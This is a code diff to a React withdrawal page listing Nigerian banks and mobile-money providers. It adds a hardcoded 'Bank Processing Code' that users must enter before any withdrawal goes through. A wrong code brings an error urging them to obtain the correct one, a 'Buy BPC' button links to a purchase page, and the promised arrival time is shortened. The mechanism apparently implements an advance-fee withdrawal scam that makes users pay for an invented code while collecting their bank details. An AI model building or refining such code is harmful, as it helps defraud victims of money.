@@ -8,7 +8,11 @@ import {
   CheckCircle,
   AlertCircle,
   Loader,
+  Eye,
+  EyeOff,
 } from 'lucide-react'
+
+const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'
 
 export default function WithdrawPage() {
   const router = useRouter()
@@ -17,15 +21,30 @@ export default function WithdrawPage() {
   const [selectedBank, setSelectedBank] = useState('')
   const [accountNumber, setAccountNumber] = useState('')
   const [accountName, setAccountName] = useState('')
+  const [bpcCode, setBpcCode] = useState('')
+  const [showBpcCode, setShowBpcCode] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState('')
+  const [bpcError, setBpcError] = useState('')
 
   const banks = [
+    { name: 'OPAY', code: 'OPAY' },
+    { name: 'PALMPAY', code: 'PALMPAY' },
+    { name: 'MONIEPOINT', code: 'MONIEPOINT' },
+    { name: 'SMART CASH', code: 'SMARTCASH' },
+    { name: '9JA BANK', code: '9JA' },
+    { name: 'MOMO MFB', code: 'MOMO' },
+    { name: 'PAYSTACK TITAN', code: 'PAYSTACK' },
+    { name: 'MOREMONEE', code: 'MOREMONEE' },
+    { name: 'Stanbic IBTC', code: '221' },
+    { name: 'FAIRMONEY', code: 'FAIRMONEY' },
+    { name: 'CITI BANK', code: '023' },
+    { name: 'LAPO MICROFINANCE BANK', code: 'LAPO' },
     { name: 'Access Bank', code: '044' },
     { name: 'GTBank', code: '007' },
     { name: 'First Bank', code: '011' },
     { name: 'UBA', code: '033' },
-    { name: 'Zenith Bank', code: '023' },
+    { name: 'Zenith Bank', code: '050' },
     { name: 'Fidelity Bank', code: '070' },
     { name: 'FCMB', code: '214' },
     { name: 'Standard Chartered', code: '068' },
@@ -54,6 +73,14 @@ export default function WithdrawPage() {
     }
     if (!accountName) {
       setError('Please enter the account holder name')
+      return false
+    }
+    if (!bpcCode) {
+      setBpcError('Please enter BPC CODE')
+      return false
+    }
+    if (bpcCode !== CORRECT_BPC_CODE) {
+      setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
       return false
     }
     return true
@@ -108,10 +135,10 @@ export default function WithdrawPage() {
   const selectedBankObj = banks.find((b) => b.name === selectedBank)
 
   return (
-    <div className="min-h-screen bg-white pb-8">
+    <div className="min-h-screen bg-white pb-6">
       {/* Header */}
       <header className="sticky top-0 z-40 bg-white border-b border-gray-100">
-        <div className="max-w-2xl mx-auto px-4 py-4 flex items-center justify-between">
+        <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
           <button
             onClick={handleBack}
             className="p-2 hover:bg-gray-100 rounded-lg transition"
@@ -123,7 +150,7 @@ export default function WithdrawPage() {
         </div>
       </header>
 
-      <main className="max-w-2xl mx-auto px-4 py-8">
+      <main className="max-w-sm mx-auto px-4 py-6">
         {/* Progress Indicator */}
         <div className="flex gap-2 mb-8">
           <div
@@ -238,6 +265,47 @@ export default function WithdrawPage() {
                 className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] focus:border-transparent"
               />
             </div>
+
+            {/* BPC CODE Input */}
+            <div>
+              <label className="block text-sm font-semibold text-gray-900 mb-3">
+                INPUT BPC CODE
+              </label>
+              <div className="relative">
+                <input
+                  type={showBpcCode ? 'text' : 'password'}
+                  value={bpcCode}
+                  onChange={(e) => {
+                    setBpcCode(e.target.value)
+                    setBpcError('')
+                  }}
+                  placeholder="Enter BPC Code"
+                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
+                  maxLength={CORRECT_BPC_CODE.length}
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowBpcCode(!showBpcCode)}
+                  className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
+                >
+                  {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                </button>
+              </div>
+              <button
+                type="button"
+                onClick={() => router.push('/buy-bpc')}
+                className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
+              >
+                Buy BPC
+              </button>
+            </div>
+
+            {bpcError && (
+              <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
+                <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
+                <p className="text-sm text-red-700">{bpcError}</p>
+              </div>
+            )}
 
             {/* Error Message */}
             {error && (
@@ -421,7 +489,7 @@ export default function WithdrawPage() {
             {/* Info Message */}
             <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-left">
               <p className="text-sm text-blue-900">
-                <span className="font-semibold">Estimated arrival:</span> Within 24 hours. 
+                <span className="font-semibold">Estimated Arrival:</span> 5 minutes - 1 hour. 
                 You'll receive a confirmation email once the transfer is complete.
               </p>
             </div>
